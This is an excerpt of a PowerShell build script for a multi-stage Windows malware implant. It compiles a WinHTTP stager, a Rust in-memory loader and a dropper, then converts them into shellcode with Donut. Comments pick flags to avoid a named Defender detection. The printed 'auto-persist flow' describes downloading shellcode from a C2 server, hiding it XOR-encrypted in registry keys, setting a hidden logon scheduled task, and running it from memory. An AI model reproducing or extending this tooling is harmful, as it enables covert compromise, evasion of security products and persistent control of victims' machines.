...
#
# Usage:
#   .\build-multistage.ps1 -Ip 192.168.2.7 -Port 4444
#   .\build-multistage.ps1 -Ip 192.168.2.7 -Port 4444 -ApiPort 5555 -Production
...
Step 1 6 "Building Stage0-Lite (C/WinHTTP -> Donut shellcode)"
...
Step 2 6 "Building JAVELIN (Rust in-memory loader, embeds Stage0-Lite)"
...
Step 3 6 "Converting JAVELIN EXE to PIC shellcode with Donut"

$javelinBin = Join-Path $DistDir "javelin.bin"

Write-Host "  donut -i javelin.exe -o javelin.bin -a 2 -f 1 -b 1 -x 1 -e 3 -t" -ForegroundColor DarkGray
...
# -b 1 = No AMSI/WLDP bypass: javelin.exe is a native Rust PE (not .NET),
# so AMSI patching is unnecessary and triggers Behavior:Win32/AMSI_Patch_T.B12
& $DonutExe -i $javelinExe -o $javelinBin -a 2 -f 1 -b 1 -x 1 -e 3 -t
...
Step 4 6 "Encrypting JAVELIN shellcode and embedding into ESTER config"
...
Step 5 6 "Building ESTER (Stage 1 dropper, embeds JAVELIN)"
...
# ---------------------------------------------------------------------------
# [6/6] Donut: ester.exe -> ester.sc  (PIC shellcode for registry persistence)
# ---------------------------------------------------------------------------

Step 6 6 "Converting ESTER EXE to PIC shellcode for auto-persist registry path"

$esterSc = Join-Path $DistDir "ester.sc"

Write-Host "  donut -i ester.exe -o ester.sc -a 2 -f 1 -b 1 -x 1 -e 3 -t" -ForegroundColor DarkGray
# Same flags as JAVELIN donut conversion:
# -a 2 = x64,  -f 1 = raw output,  -b 1 = no AMSI bypass (native PE),
# -x 1 = ExitThread (keeps host process alive),  -e 3 = random names,  -t = multithreaded
& $DonutExe -i $esterDest -o $esterSc -a 2 -f 1 -b 1 -x 1 -e 3 -t
if ($LASTEXITCODE -ne 0) {
    Write-Host "  WARNING: Donut conversion of ester.exe failed (exit $LASTEXITCODE)" -ForegroundColor Yellow
    Write-Host "  Registry shellcode auto-persist will not be available on C2" -ForegroundColor Yellow
} else {
    if (Test-Path $esterSc) {
        $scKB = [math]::Round((Get-Item $esterSc).Length / 1KB, 1)
        Write-Host "  -> dist\ester.sc : $scKB KB (PIC shellcode for registry persist)" -ForegroundColor Green
    } else {
        Write-Host "  WARNING: ester.sc not generated by Donut" -ForegroundColor Yellow
    }
}
...
$artifacts = @(
    ...
    @{ Name = "ester.sc";        Desc = "ESTER PIC shellcode (for registry auto-persist)" }
)
...
Write-Host ""
Write-Host "Auto-persist flow (agent after delay):" -ForegroundColor Cyan
Write-Host "  agent downloads ester.sc from /api/stage0/ester.sc"
Write-Host "    -> XOR-encrypts + stores in dual-split HKCU registry keys"
Write-Host "    -> creates schtask ONLOGON trigger (hidden, no console)"
Write-Host "    -> on reboot: reads registry -> decrypts -> VirtualAlloc(RW->RX) -> CreateThread"
Write-Host ""
